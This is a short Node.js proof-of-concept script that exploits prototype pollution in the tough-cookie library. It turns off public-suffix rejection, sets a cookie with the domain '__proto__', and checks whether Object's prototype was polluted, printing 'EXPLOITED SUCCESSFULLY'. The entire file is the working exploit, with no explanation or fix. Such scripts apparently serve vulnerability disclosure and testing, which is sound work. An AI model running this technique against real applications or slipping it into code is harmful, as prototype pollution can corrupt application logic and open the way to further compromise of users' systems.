const tough = require("tough-cookie");

const cookiejar = new tough.CookieJar(undefined, {
	rejectPublicSuffixes: false,
});

const path = "/exploit";

cookiejar.setCookieSync(
	`Slonser=polluted; Domain=__proto__; Path=${path}`,
	"https://__proto__/admin"
);

const outputNessage =
	path in Object ? "EXPLOITED SUCCESSFULLY" : "EXPLOIT FAILED";

console.log(outputNessage);
